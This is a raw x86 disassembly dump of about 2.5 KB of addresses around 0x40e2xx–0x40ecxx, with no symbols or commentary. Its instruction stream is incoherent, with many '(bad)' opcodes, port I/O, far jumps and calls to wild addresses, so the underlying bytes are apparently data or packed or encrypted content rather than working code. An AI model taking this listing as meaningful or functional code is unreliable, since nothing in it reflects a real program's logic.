  40e243:	test   DWORD PTR [edx+0xe],eax
  40e246:	test   edx,esi
  40e248:	sub    bh,BYTE PTR [esi-0x3]
  40e24b:	inc    DWORD PTR [eax+0x7e80ea4]
  40e251:	fdivr  st,st(7)
  40e253:	push   DWORD PTR [edi]
  40e255:	fldcw  WORD PTR [eax+0x1]
  40e258:	cld    
  40e259:	test   BYTE PTR cs:[ecx],al
  40e25c:	xor    al,0x89
  40e25e:	out    dx,al
  40e25f:	cmp    eax,DWORD PTR [edi-0xb]
  40e262:	dec    eax
  40e263:	mov    DWORD PTR [eax+0xa390ea4],ecx
  40e269:	(bad)  
  40e26a:	cmp    cl,BYTE PTR [ebp+0x7b8307ea]
  40e270:	xor    BYTE PTR [eax],dl
  40e272:	jne    0x40e295
  40e274:	scas   eax,DWORD PTR es:[edi]
  40e275:	inc    BYTE PTR [eax+eax*8+0x46a16d0]
  40e27c:	ja     0x40e242
  40e27e:	add    dl,BYTE PTR [eax-0x45]
  40e281:	clc    
  40e282:	and    ebp,DWORD PTR [eax]
  40e284:	pop    ecx
  40e285:	inc    eax
  40e286:	and    al,0x28
  40e288:	pushf  
  40e289:	ja     0x40e303
  40e28b:	add    ah,dh
  40e28d:	cmp    BYTE PTR [esi+0x427df074],0x24
  40e294:	fidivr WORD PTR [edx+eax*2+0x24]
  40e298:	mov    ah,0x88
  40e29a:	inc    edx
  40e29b:	and    al,0xe4
  40e29d:	add    cl,0x8
  40e2a0:	jg     0x40e2a7
  40e2a2:	jl     0x40e26e
	...
  40e2c0:	add    BYTE PTR [eax],al
  40e2c2:	ja     0x40e29c
  40e2c4:	push   esp
  40e2c5:	call   0x40b659
  40e2ca:	mov    esi,0xd5ce801
  40e2cf:	sub    al,0x3
  40e2d1:	add    BYTE PTR [esi+0x19f2f959],al
  40e2d7:	jo     0x40e262
  40e2d9:	pop    ebx
  40e2da:	xor    ecx,ebx
  40e2dc:	stc    
  40e2dd:	sbb    eax,0x5d8dae03
  40e2e2:	adc    DWORD PTR [esi],esp
  40e2e4:	cmp    DWORD PTR [ecx+edx*1],eax
  40e2e7:	pushf  
  40e2e8:	loope  0x40e274
  40e2ea:	push   cs
  40e2eb:	and    al,0xc4
  40e2ed:	jae    0x40e2f5
  40e2ef:	jg     0x40e303
  40e2f1:	or     DWORD PTR [ebp-0x5f],0x52
  40e2f5:	(bad)  
  40e2f6:	fxch   st(4)
  40e2f8:	jmp    0x6ee7:0xeac4c98c
  40e2ff:	das    
  40e300:	add    eax,DWORD PTR [eax]
  40e302:	nop
  40e303:	jmp    0xed73e73f
  40e308:	out    0x1a,eax
  40e30a:	sub    ah,ch
  40e30c:	out    0xf,eax
  40e30e:	xchg   esi,eax
  40e30f:	in     eax,dx
  40e310:	out    0xf,eax
  40e312:	mov    fs,WORD PTR [esi+0xa]
  40e315:	cmp    ecx,DWORD PTR [ebx]
  40e317:	inc    ebp
  40e318:	retf   0xe632
  40e31b:	adc    ch,BYTE PTR [esp+eax*2+0x6a02a7d8]
  40e322:	add    eax,0x24475c
	...
  40e343:	add    BYTE PTR ds:0x698d50f9,dl
  40e349:	(bad)
  40e34c:	inc    ecx
  40e34d:	int    0xe1
  40e34f:	out    0x6a,eax
  40e351:	(bad)  
  40e353:	add    BYTE PTR [esi-0x69e01814],al
  40e359:	jmp    0x40e366
  40e35b:	push   ebx
  40e35c:	xchg   esp,eax
  40e35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e35e:	stos   BYTE PTR es:[edi],al
  40e35f:	and    al,ah
  40e361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e362:	add    cl,BYTE PTR [ebx+0x200d0049]
  40e368:	dec    edx
  40e369:	pop    edx
  40e36a:	ret    0xa988
  40e36d:	pop    esp
  40e36e:	sub    eax,DWORD PTR [edi]
  40e370:	or     eax,0x8faf6255
  40e375:	stos   DWORD PTR es:[edi],eax
  40e376:	mov    eax,0xd925e350
  40e37b:	sub    DWORD PTR ds:0xdd163653,ecx
  40e381:	adc    DWORD PTR [ecx-0xb3c71fd],ebp
  40e387:	mov    ss,ecx
  40e389:	addr16 mov eax,0x2e010bc5
  40e38f:	inc    esi
  40e390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e391:	aas    
  40e392:	jmp    0xdbfbf09a
  40e397:	fistp  WORD PTR [eax+eax*2]
  40e39a:	jmp    0xca746625
  40e39f:	mov    cl,dl
  40e3a1:	jae    0x40e404
  40e3a3:	dec    esi
  40e3a4:	jge    0x40e3b0
  40e3a6:	xchg   ebp,eax
  40e3a7:	lds    eax,FWORD PTR [eax]
	...
  40e3c5:	add    dh,bh
  40e3c7:	rcl    al,0x10
  40e3ca:	mov    BYTE PTR [edi-0x4771fea5],bh
  40e3d0:	int    0x32
  40e3d2:	or     ch,bh
  40e3d4:	scas   eax,DWORD PTR es:[edi]
  40e3d5:	in     eax,0x59
  40e3d7:	mov    ah,0xd1
  40e3d9:	pop    es
  40e3da:	xchg   esp,eax
  40e3db:	inc    ebx
  40e3dc:	mov    ebp,0x5bff4b8d
  40e3e1:	inc    ecx
  40e3e2:	lds    edx,FWORD PTR [eax-0x5a]
  40e3e5:	adc    ecx,ebp
  40e3e7:	push   cs
  40e3e8:	sub    DWORD PTR [eiz*4+0xd0495b9],eax
  40e3ef:	cmc    
  40e3f0:	and    ebx,eax
  40e3f2:	xor    DWORD PTR [ebx],0xb1cd1f59
  40e3f8:	cwde   
  40e3f9:	out    0x49,eax
  40e3fb:	fdiv   st(7),st
  40e3fd:	push   cs
  40e3fe:	mov    BYTE PTR [edx+0x5],al
  40e401:	xor    DWORD PTR [ecx+edi*4-0x5d891602],edx
  40e408:	pop    ecx
  40e409:	call   0x59b56f1c
  40e40e:	sbb    DWORD PTR [ebx-0x57f11701],ebx
  40e414:	fldenv [ebx+0x278b0011]
  40e41a:	(bad)  [edx+0x77e15944]
  40e420:	add    ecx,ebp
  40e422:	push   cs
  40e423:	and    bh,0x2b
  40e426:	ud0    edi,edi
  40e429:	jno    0x40e42b
	...
  40e447:	add    BYTE PTR [ecx+esi*2+0x13],bl
  40e44b:	test   eax,0x6050260e
  40e450:	into   
  40e451:	add    bh,bh
  40e453:	pop    ds
  40e454:	sti    
  40e455:	dec    ecx
  40e456:	mov    BYTE PTR [esi-0x7c2a46ed],ah
  40e45c:	mov    DWORD PTR [edi+edx*8+0x528c5cee],0xfebba9e6
  40e467:	jmp    0x5f11d97a
  40e46c:	push   es
  40e46d:	mov    ecx,DWORD PTR [edi-0x32]
  40e470:	adc    edx,eax
  40e472:	jbe    0x40e465
  40e474:	sub    al,0x87
  40e476:	pop    esi
  40e477:	in     eax,dx
  40e478:	sub    al,0x87
  40e47a:	inc    esi
  40e47b:	out    0x54,eax
  40e47d:	push   ebp
  40e47e:	leave  
  40e47f:	stos   BYTE PTR es:[edi],al
  40e480:	pop    ebp
  40e481:	test   ebx,ebp
  40e483:	push   0xffffff8a
  40e485:	mov    al,0x80
  40e487:	(bad)  
  40e488:	repnz (bad) 
  40e48a:	(bad)  
  40e48b:	call   0xda9836d3
  40e490:	into   
  40e491:	in     eax,dx
  40e492:	fiadd  DWORD PTR [eax]
  40e494:	cmp    eax,0x31482451
  40e499:	icebp  
  40e49a:	and    ecx,DWORD PTR [edi+ecx*2+0x2a]
  40e49e:	xor    al,al
  40e4a0:	sub    eax,0x21542451
  40e4a5:	icebp  
  40e4a6:	and    ebx,DWORD PTR [eax+0x7f]
  40e4a9:	sub    DWORD PTR [eax+0x5c],ecx
	...
  40e4c7:	add    BYTE PTR [eax],al
  40e4c9:	add    BYTE PTR [eax],cl
  40e4cb:	in     al,0x32
  40e4cd:	shl    BYTE PTR [ecx],0xf1
  40e4d0:	and    esp,DWORD PTR [edi+ebx*4-0x79]
  40e4d4:	jb     0x40e4fa
  40e4d6:	or     al,0x8b
  40e4d8:	pop    edx
  40e4d9:	and    al,0x74
  40e4db:	sub    edi,esp
  40e4dd:	shl    BYTE PTR [edx],cl
  40e4df:	add    al,0x0
  40e4e1:	(bad)  
  40e4e2:	enter  0x82d8,0x0
  40e4e6:	je     0x40e4e4
  40e4e8:	mov    bh,0x9f
  40e4ea:	fs cld 
  40e4ec:	inc    esi
  40e4ee:	test   al,0xd8
  40e4f0:	ss in  al,dx
  40e4f2:	sar    BYTE PTR [eax+eax*1],0x89
  40e4f6:	mov    al,ds:0xa0893ed8
  40e4fb:	fadd   DWORD PTR [edx-0x18]
  40e4fe:	jno    0x40e55a
  40e500:	add    DWORD PTR [eax],eax
  40e502:	mov    eax,ds:0x34ac232f
  40e507:	cld    
  40e508:	push   DWORD PTR [edi+0x384]
  40e50e:	dec    esp
  40e50f:	pop    ss
  40e510:	pop    edx
  40e511:	add    esp,esi
  40e513:	test   ah,al
  40e515:	push   eax
  40e516:	jno    0x40e558
  40e518:	and    al,0x3c
  40e51a:	adc    al,0x64
  40e51c:	xor    BYTE PTR [ebx],cl
  40e51e:	out    0x3,al
  40e520:	test   al,al
  40e522:	or     DWORD PTR [esi],edx
  40e524:	lea    eax,[eax+ecx*8+0xdffff37]
  40e52b:	test   eax,0x8d52
	...
  40e54c:	dec    ecx
  40e54d:	mov    ebp,0x9db54ff6
  40e552:	or     eax,DWORD PTR [edx]
  40e554:	or     eax,0x910ec41d
  40e559:	jmp    0x224de560
  40e55e:	test   DWORD PTR [ebx-0x2],0x498d0268
  40e565:	std    
  40e566:	dec    ebx
  40e567:	mov    DWORD PTR [ecx+0x5],edx
  40e56a:	in     al,0x8c
  40e56c:	dec    ecx
  40e56d:	std    
  40e56e:	dec    edi
  40e56f:	mov    ecx,edx
  40e571:	add    al,0xe0
  40e573:	mov    ecx,cs
  40e575:	cld    
  40e576:	and    ecx,DWORD PTR [ecx-0x7313fb2f]
  40e57c:	leave  
  40e57d:	cld    
  40e57e:	jecxz  0x40e508
  40e580:	rol    esp,1
  40e582:	push   cs
  40e583:	(bad)  
  40e584:	leave  
  40e585:	mov    esp,0x68ded816
  40e58a:	add    al,bh
  40e58c:	leave  
  40e58d:	mov    esp,0xa90d02e6
  40e592:	add    cl,BYTE PTR [ebx+0x6616bcc9]
  40e598:	xchg   BYTE PTR [ecx+0x10e9b385],ch
  40e59e:	add    al,0x0
  40e5a0:	or     eax,0xc586ad1
  40e5a5:	test   eax,0xe4f15bf9
  40e5aa:	adc    esp,DWORD PTR cs:[ebp+0x3f86bc]
	...
  40e5cd:	add    BYTE PTR ds:0x4988cfbe,cl
  40e5d3:	std    
  40e5d4:	aas    
  40e5d5:	cmp    ecx,esi
  40e5d7:	popf   
  40e5d8:	jle    0x40e5a3
  40e5da:	or     eax,0x918d02a9
  40e5df:	dec    esp
  40e5e1:	fnclex 
  40e5e3:	mov    dh,0xe8
  40e5e5:	push   ebx
  40e5e6:	test   BYTE PTR [ebx-0x33],dl
  40e5e9:	psrld  mm1,mm6
  40e5ec:	popa   
  40e5ed:	mov    bl,0x7
  40e5ef:	mov    bl,0xfc
  40e5f1:	sbb    BYTE PTR [esi-0x79bc3ac5],dl
  40e5f7:	pop    es
  40e5f8:	fs dec edi
  40e5fa:	jmp    0x3796010e
  40e5ff:	lock mov esi,0xb4dc1eb8
  40e605:	push   ebx
  40e606:	call   0xe52b:0x527eb950
  40e60d:	mov    ah,dh
  40e60f:	fcmovnu st,st(0)
  40e611:	push   ecx
  40e612:	or     BYTE PTR [edi*8+0x61ffcd14],0x3f
  40e61a:	sub    DWORD PTR [eax],edx
  40e61c:	pusha  
  40e61d:	aas    
  40e61e:	xor    DWORD PTR [eax],ebx
  40e620:	loop   0x40e5e6
  40e622:	adc    edi,DWORD PTR [eax+ebp*2+0x3]
  40e626:	or     eax,0x800b6200
  40e62b:	dec    ebx
  40e62c:	lds    esp,FWORD PTR [edi]
  40e62e:	fild   WORD PTR [esp+ebx*4+0xdf]
	...
  40e64d:	add    BYTE PTR [eax],al
  40e64f:	add    dl,bh
  40e651:	push   ecx
  40e652:	xchg   ebx,eax
  40e653:	add    ah,BYTE PTR [ebp+0xd03ce0f]
  40e659:	push   eax
  40e65a:	out    dx,al
  40e65b:	push   ecx
  40e65c:	std    
  40e65d:	jl     0x40e607
  40e65f:	xor    esi,eax
  40e661:	sbb    BYTE PTR [eax+eiz*8-0x5a],0x0
  40e666:	pop    esp
  40e667:	push   eax
  40e668:	xchg   BYTE PTR [ebx],bh
  40e66a:	add    eax,0x1a0897f0
  40e66f:	push   ebx
  40e670:	nop
  40e671:	dec    esp
  40e672:	add    eax,0x515f3c
  40e677:	inc    ecx
  40e678:	test   eax,0x3ee94032
  40e67d:	mov    ch,0x50
  40e67f:	stc    
  40e680:	lea    esi,[ebp+0x74]
  40e683:	into   
  40e684:	clc    
  40e685:	cmp    BYTE PTR [ebx-0x33],0x1e
  40e689:	or     BYTE PTR [ebp-0x13],dh
  40e68c:	xchg   edi,eax
  40e68d:	inc    ecx
  40e68e:	and    al,0x1
  40e690:	mov    dl,0x73
  40e693:	aad    0x18
  40e695:	not    DWORD PTR [edi]
  40e697:	std    
  40e698:	or     edx,DWORD PTR [eax-0x75]
  40e69b:	and    eax,0x198b0dad
  40e6a0:	mov    ?,WORD PTR [ebp-0x3f09ae02]
  40e6a6:	add    cl,ch
  40e6a8:	test   DWORD PTR [ecx+0x24],eax
  40e6ab:	(bad)  
  40e6ad:	mov    ah,0x14
  40e6af:	mov    cl,0x1f
  40e6b1:	inc    eax
  40e6b2:	add    BYTE PTR [edx+0x0],dh
	...
  40e6d1:	add    ch,cl
  40e6d3:	(bad)  [ebx]
  40e6d5:	bound  eax,QWORD PTR [ecx]
  40e6d7:	push   eax
  40e6d8:	call   FWORD PTR [eax-0x32bc76ea]
  40e6de:	push   es
  40e6df:	mov    DWORD PTR [edi],eax
  40e6e1:	mov    ecx,0x6a0850a3
  40e6e6:	int    0xdb
  40e6e8:	sbb    ebp,ebx
  40e6ea:	pop    DWORD PTR [ecx+0x24]
  40e6ed:	fld    QWORD PTR [edx-0x4a]
  40e6f0:	dec    ebx
  40e6f1:	lds    esi,FWORD PTR [edx]
  40e6f3:	push   es
  40e6f4:	test   edi,edi
  40e6f6:	js     0x40e6ae
  40e6f8:	(bad)  
  40e6f9:	pop    esp
  40e6fa:	fstp   st(3)
  40e6fc:	aaa    
  40e6fd:	rol    edx,1
  40e6ff:	pop    es
  40e700:	add    ch,cl
  40e702:	test   DWORD PTR [ecx],esi
  40e704:	and    al,0x9
  40e706:	popa   
  40e707:	loop   0x40e705
  40e709:	call   0x9c6e1c
  40e70e:	adc    BYTE PTR [ecx+ecx*4+0x23f4b3de],ah
  40e715:	and    BYTE PTR [eax],dl
  40e717:	in     eax,0x3f
  40e719:	add    ah,cl
  40e71b:	in     al,dx
  40e71c:	fild   WORD PTR [eax]
  40e71e:	hlt    
  40e71f:	xor    al,0xbf
  40e721:	je     0x40e6eb
  40e723:	mov    DWORD PTR [edx+0x24],eax
  40e726:	int3   
  40e727:	mov    DWORD PTR [esi],eax
  40e729:	lea    eax,[eax]
  40e72b:	mov    al,ds:0x6d24520e
  40e730:	dec    edi
  40e731:	and    BYTE PTR [ecx],dh
  40e733:	shl    DWORD PTR [ebx+0xb],0x0
	...
  40e753:	add    BYTE PTR [edx],al
  40e755:	cmp    DWORD PTR [edx+0x24],0x940d6dc4
  40e75c:	hlt    
  40e75d:	imul   eax,DWORD PTR [eax],0xbf34e432
  40e763:	je     0x40e711
  40e765:	jne    0x40e7a9
  40e767:	and    al,0x24
  40e769:	sti    
  40e76a:	(bad)  
  40e76b:	push   DWORD PTR [edi+eax*4+0x72]
  40e76f:	and    al,0x4
  40e771:	fs and esp,eax
  40e774:	add    BYTE PTR fs:[ebx+0x2e4104c],cl
  40e77b:	dec    esp
  40e77c:	push   eax
  40e77d:	dec    esp
  40e77e:	mov    eax,DWORD PTR [eax+edx*2+0x50]
  40e782:	lea    ebx,[ebp+eiz*2+0x8]
  40e786:	mov    DWORD PTR [eax+edx*2+0x18],ebx
  40e78a:	test   ebx,ebx
  40e78c:	shl    DWORD PTR [ecx+esi*1-0x7522e001],0xc3
  40e794:	or     al,0x1e
  40e796:	rol    BYTE PTR [ecx],1
  40e798:	xor    al,0x89
  40e79a:	test   BYTE PTR [ebp-0x74a110d5],0xf0
  40e7a1:	lahf   
  40e7a2:	mov    ecx,DWORD PTR cs:0x4d164814
  40e7a9:	test   eax,0x630c4689
  40e7ae:	cld    
  40e7af:	add    BYTE PTR [edi-0x7ab02023],al
  40e7b5:	loop   0x40e7b5
  40e7b7:	mov    DWORD PTR [eax],eax
	...
  40e7d5:	add    BYTE PTR [ecx-0x3],dl
  40e7d8:	push   edi
  40e7d9:	mov    BYTE PTR [edx-0x5d],cl
  40e7dc:	mov    BYTE PTR [ebx+0x31],al
  40e7df:	adc    DWORD PTR [esi+eax*2+0x466c9a0a],ecx
  40e7e6:	adc    cl,bh
  40e7e8:	mov    ah,0x73
  40e7ea:	jmp    0x59f6edb
  40e7ef:	push   ss
  40e7f0:	mov    ch,0xd5
  40e7f2:	add    dh,bl
  40e7f4:	cmp    al,0x5
  40e7f6:	push   cs
  40e7f7:	xchg   ecx,eax
  40e7f8:	add    al,0xb6
  40e7fa:	dec    edx
  40e7fb:	mov    ds:0xfd21ff52,eax
  40e800:	pop    ds
  40e801:	push   ebx
  40e802:	xchg   edx,eax
  40e803:	repz add al,0xb6
  40e806:	rcr    BYTE PTR [ecx+0x62bb0f52],cl
  40e80c:	cld    
  40e80d:	inc    BYTE PTR [ecx]
  40e80f:	std    
  40e810:	aaa    
  40e811:	add    ecx,DWORD PTR [esi-0x67]
  40e814:	mov    bl,0xd5
  40e816:	xchg   esi,eax
  40e817:	test   esi,ebx
  40e819:	cmp    ecx,DWORD PTR [esi-0x1e73201b]
  40e81f:	mov    esp,0xe864e84a
  40e824:	add    al,BYTE PTR [eax]
  40e826:	cwde   
  40e827:	(bad)  
  40e828:	ficom  WORD PTR [ebx+0x35]
  40e82b:	or     ebx,eax
  40e82d:	add    BYTE PTR ds:0xad243024,cl
  40e833:	add    ch,cl
  40e835:	ror    BYTE PTR [ecx+ebp*4],0x87
  40e839:	inc    esp
	...
  40e856:	add    BYTE PTR [eax],al
  40e858:	adc    eax,0x861b7000
  40e85d:	mov    ebx,0x86b6563d
  40e862:	retf   
  40e863:	push   esi
  40e864:	iret   
  40e865:	sti    
  40e866:	call   0x6c4532f3
  40e86b:	retf   0x881
  40e86e:	jb     0x40e8bb
  40e870:	add    eax,0xf6082089
  40e875:	out    dx,al
  40e876:	popa   
  40e877:	push   ebx
  40e878:	adc    eax,0x2531b2f7
  40e87d:	dec    edx
  40e87e:	jb     0x40e8b3
  40e880:	or     DWORD PTR [ebp-0x894ce04],eax
  40e886:	mov    ds:0x721a2130,al
  40e88b:	adc    cl,BYTE PTR [esi+0x4a8aeac0]
  40e891:	add    al,0xf
  40e893:	jg     0x40e851
  40e895:	sub    al,0x7b
  40e897:	sbb    eax,0x6dc10e4
  40e89c:	mov    es,eax
  40e89e:	jmp    0x4fc4:0x1a044a8a
  40e8a5:	jle    0x40e86f
  40e8a7:	pop    es
  40e8a8:	or     eax,0x4e07a887
  40e8ad:	dec    esp
  40e8ae:	jb     0x40e857
  40e8b0:	lea    esp,[ebx+0xd01a8]
  40e8b6:	xchg   edi,eax
  40e8b7:	dec    esp
  40e8b8:	cmc    
  40e8b9:	aad    0xe8
  40e8bb:	add    eax,DWORD PTR [eax]
	...
  40e8d9:	add    BYTE PTR ds:0x6274e926,cl
  40e8df:	lds    ebp,FWORD PTR [ecx-0xc4d1dfd]
  40e8e5:	push   ebx
  40e8e6:	sbb    eax,DWORD PTR [eax-0x17]
  40e8e9:	or     BYTE PTR [esi+0x3],0x93
  40e8ed:	add    DWORD PTR [ebp-0x32ddffe7],esp
  40e8f3:	jmp    DWORD PTR [edi-0x50]
  40e8f6:	das    
  40e8f7:	call   0xe901:0xf78cd111
  40e8fe:	lea    ebp,[ebx-0x3f]
  40e901:	aam    0xbe
  40e903:	mov    dl,0xe7
  40e905:	mov    cl,0x89
  40e907:	mov    cl,0xfe
  40e909:	in     al,dx
  40e90a:	loopne 0x40e90c
  40e90c:	add    cl,ch
  40e90e:	adc    BYTE PTR [eax+edx*2],cl
  40e911:	inc    ebx
  40e912:	adc    DWORD PTR [ebx-0x4675868c],eax
  40e918:	(bad)  
  40e919:	xchg   ecx,eax
  40e91a:	sub    BYTE PTR [ebx+0x0],0xe9
  40e91e:	test   DWORD PTR [ecx+0x7d],esi
  40e921:	retf   0x2c8d
  40e924:	fcom   DWORD PTR [ecx+0x47]
  40e927:	mov    cl,0xfe
  40e929:	jmp    0xe89693c4
  40e92e:	push   cs
  40e92f:	add    DWORD PTR [ecx+edi*1+0x41],0xffffff85
  40e934:	lds    ebx,FWORD PTR [ecx]
  40e936:	inc    esi
  40e937:	test   al,0x5e
  40e939:	sti    
  40e93a:	adc    DWORD PTR [eax],eax
  40e93c:	test   DWORD PTR [ecx],ebp
	...
  40e95a:	add    BYTE PTR [eax],al
  40e95c:	push   cs
  40e95d:	mov    edi,DWORD PTR [edi+0x82c516d]
  40e963:	sbb    cl,BYTE PTR [ecx+0x1b]
  40e966:	mov    ds:0x3ebb39,eax
  40e96b:	sahf   
  40e96c:	loope  0x40e910
  40e96e:	add    cl,ch
  40e970:	push   cs
  40e971:	add    DWORD PTR [ebx+ebp*1-0x38014d64],0x44
  40e979:	mov    cl,0xfe
  40e97b:	test   eax,0x59f92b11
  40e980:	adc    bh,al
  40e982:	ret    0x1762
  40e985:	jnp    0x40e946
  40e987:	add    BYTE PTR [eax-0x3417b14d],bh
  40e98d:	pop    edi
  40e98e:	std    
  40e98f:	push   DWORD PTR [edi-0x4b3d015b]
  40e995:	scas   al,BYTE PTR es:[edi]
  40e996:	out    0xdd,al
  40e998:	out    0xfb,eax
  40e99a:	call   DWORD PTR [ebp-0x47]
  40e99d:	test   al,0xbc
  40e99f:	or     dl,al
  40e9a1:	cmp    DWORD PTR [eax],eax
  40e9a3:	push   esi
  40e9a4:	rcl    DWORD PTR [edi],cl
  40e9a6:	sbb    BYTE PTR [edx],dl
  40e9a8:	and    al,0xfc
  40e9aa:	jg     0x40e9e9
  40e9ac:	fmul   st(7),st
  40e9ae:	inc    ecx
  40e9af:	add    ah,dh
  40e9b1:	not    DWORD PTR [esi]
  40e9b3:	call   0x3e579f
  40e9b8:	push   0x670e72bd
  40e9bd:	test   al,0xea
  40e9bf:	fld    QWORD PTR [eax]
	...
  40e9dd:	add    bh,dh
  40e9df:	sti    
  40e9e0:	inc    ebp
  40e9e2:	test   eax,0xa443db94
  40e9e7:	sti    
  40e9e8:	push   ebp
  40e9e9:	(bad)  
  40e9ea:	fld    DWORD PTR [eax]
  40e9ec:	adc    al,BYTE PTR [eax-0x4c]
  40e9ef:	adc    al,0x66
  40e9f1:	retf   
  40e9f2:	idiv   ebx
  40e9f4:	imul   eax,DWORD PTR [eax],0x43de44bc
  40e9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9fb:	ins    DWORD PTR es:[edi],dx
  40e9fc:	adc    esp,DWORD PTR [eax]
  40e9fe:	xchg   DWORD PTR [eax+eax*1],edi
  40ea01:	mov    esp,esp
  40ea03:	xchg   esp,esi
  40ea05:	je     0x40ea76
  40ea07:	adc    bh,bh
  40ea09:	push   esi
  40ea0a:	xor    ebx,DWORD PTR [eax]
  40ea0c:	sbb    al,0x13
  40ea0e:	mov    ah,0xfc
  40ea10:	test   al,al
  40ea12:	cwde   
  40ea13:	or     eax,0xfc64803d
  40ea18:	push   DWORD PTR [ebx+0xc]
  40ea1b:	push   esi
  40ea1c:	call   DWORD PTR ds:0x4015a30d
  40ea22:	or     eax,0x905dc2d6
  40ea27:	out    0x36,al
  40ea29:	push   cs
  40ea2a:	xchg   BYTE PTR [edx-0x1a],ah
  40ea2d:	add    edx,DWORD PTR [edi+eiz*4-0x67c9ff8e]
  40ea34:	jge    0x40e9fb
  40ea36:	es retf 
  40ea38:	cmc    
  40ea39:	mov    edi,0x55029a4f
  40ea3e:	xchg   esi,eax
  40ea3f:	lds    eax,FWORD PTR [ebx+ebp*8+0x0]
	...
  40ea5e:	add    BYTE PTR [eax],al
  40ea60:	sbb    eax,0xd8e7ef19
  40ea65:	fiadd  DWORD PTR [ebx]
  40ea67:	add    BYTE PTR [ebx+0x16],bl
  40ea6a:	aaa    
  40ea6b:	xor    ebp,DWORD PTR [ebx+0xd42d0a1]
  40ea71:	pop    ss
  40ea72:	mov    cl,0x14
  40ea74:	cmc    
  40ea75:	stos   BYTE PTR es:[edi],al
  40ea76:	inc    edx
  40ea77:	add    BYTE PTR [ebp+0x4edc9acc],cl
  40ea7d:	cdq    
  40ea7e:	add    dh,BYTE PTR [ebp+0x1a]
  40ea81:	and    DWORD PTR [ebp-0x3],0xbf8786ba
  40ea88:	cmp    DWORD PTR [edi-0x6b46db7d],ebx
  40ea8e:	inc    esp
  40ea8f:	add    BYTE PTR ds:0xb8e80667,cl
  40ea95:	pop    edx
  40ea96:	add    al,BYTE PTR [ecx]
  40ea98:	cmp    ecx,DWORD PTR [esi+0x17]
  40ea9b:	sbb    al,0x1f
  40ea9d:	pop    ecx
  40ea9e:	add    ch,BYTE PTR [edx+0xf]
  40eaa1:	jno    0x40eb20
  40eaa3:	je     0x40eb22
  40eaa5:	push   ecx
  40eaa6:	dec    ecx
  40eaa7:	sti    
  40eaa8:	or     al,0x99
  40eaaa:	jnp    0x40eaf0
  40eaac:	adc    eax,0x62ff929c
  40eab1:	cdq    
  40eab2:	sbb    al,BYTE PTR [edx]
  40eab4:	or     al,0x0
  40eab6:	jmp    0x26bba7be
  40eabb:	pushf  
  40eabc:	jnp    0x40ea69
  40eabe:	out    0x3,eax
  40eac0:	mov    bh,0x3
  40eac2:	pop    esp
  40eac3:	inc    edi
	...
  40eae0:	add    BYTE PTR [eax],al
  40eae2:	or     DWORD PTR [eax+0x72],edx
  40eae5:	retf   0x622a
  40eae8:	add    DWORD PTR [ebx],eax
  40eaea:	or     eax,0x97af737d
  40eaef:	mov    BYTE PTR [eax],0xee
  40eaf2:	push   ss
  40eaf3:	add    ecx,ebp
  40eaf5:	sbb    eax,0x1453aef9
  40eafa:	or     dh,BYTE PTR ds:0x4c19b0d5
  40eb00:	test   DWORD PTR [ebx+0xd],0x87ffac83
  40eb07:	vaddps xmm4,xmm5,xmm6
  40eb0b:	add    cl,ch
  40eb0d:	push   eax
  40eb0e:	inc    ebx
  40eb0f:	mov    ecx,0x53daffaa
  40eb14:	jb     0x40eab5
  40eb16:	lea    ebx,[ebx+0xd0824]
  40eb1c:	imul   ebp,esi,0x429a192
  40eb22:	or     al,0x53
  40eb24:	pop    ds
  40eb25:	pop    ecx
  40eb26:	xchg   bh,al
  40eb28:	cmc    
  40eb29:	or     bh,bl
  40eb2b:	mov    edi,0xc167f
  40eb30:	jmp    0x64104cb3
  40eb35:	mov    al,0x93
  40eb37:	xchg   edi,eax
  40eb38:	or     BYTE PTR [ecx],dh
  40eb3a:	or     eax,0x49466400
  40eb3f:	dec    edi
  40eb40:	dec    esi
  40eb41:	ss add eax,0x532e7b
	...
  40eb63:	add    BYTE PTR [ebp-0x22],ah
  40eb66:	cmp    eax,0xff846bb0
  40eb6b:	adc    DWORD PTR [ebx],ebx
  40eb6d:	fisttp QWORD PTR [esp+eiz*4+0x19683e52]
  40eb74:	nop
  40eb75:	inc    ecx
  40eb76:	add    BYTE PTR [ecx+0x6900000f],dl
  40eb7c:	jge    0x40eb91
  40eb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb7f:	cli    
  40eb80:	into   
  40eb81:	push   esi
  40eb83:	and    DWORD PTR [eax],eax
  40eb85:	sar    ch,0x29
  40eb88:	mov    eax,0xee9009c
  40eb8d:	jnp    0x40eb5c
  40eb8f:	daa    
  40eb90:	sldt   WORD PTR [ecx+0x33]
  40eb94:	aam    0xa8
  40eb96:	call   0x40fd4e
  40eb9b:	push   0x74
  40eb9d:	(bad)  
  40eba0:	stos   BYTE PTR es:[edi],al
  40eba1:	lods   eax,DWORD PTR ds:[esi]
  40eba2:	mov    ebp,DWORD PTR [ecx+ebp*1-0x52]
  40eba6:	(bad)  
  40eba7:	mov    esi,0xa1847b41
  40ebac:	popf   
  40ebad:	scas   al,BYTE PTR es:[edi]
  40ebae:	inc    cl
  40ebb0:	add    BYTE PTR [esi+0x0],cl
  40ebb3:	jmp    0x724d200f
  40ebb8:	fidivr WORD PTR [esp+eax*4-0x5f]
  40ebbc:	jge    0x40eb6c
  40ebbe:	inc    BYTE PTR [ecx-0x16ffb206]
  40ebc4:	mov    DWORD PTR [edx+0xb0ff],ebp
	...
  40ebe6:	adc    DWORD PTR [eax],eax
  40ebe8:	jbe    0x40ebd6
  40ebea:	add    al,0x1
  40ebec:	pop    edi
  40ebed:	cmp    BYTE PTR [ecx+esi*8],0xc8
  40ebf1:	push   0x66
  40ebf3:	add    DWORD PTR [edi],ecx
  40ebf5:	je     0x40ec47
  40ebf7:	pop    ss
  40ebf8:	add    dh,BYTE PTR [edi-0x16963cf9]
  40ebfe:	push   edi
  40ebff:	shl    bh,0x0
  40ec02:	fcom   QWORD PTR [ebp+0x1]
  40ec05:	add    BYTE PTR [ebx+0x33],bh
  40ec08:	mov    bh,0xf8
  40ec0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec0b:	inc    ecx
  40ec0c:	add    BYTE PTR [ebx+0x3875032b],al
  40ec12:	fnstenv [esi]
  40ec14:	or     BYTE PTR [eax-0x47],dl
  40ec17:	jbe    0x40ebd7
  40ec19:	sti    
  40ec1a:	sbb    ebx,DWORD PTR [ebp+0x4e]
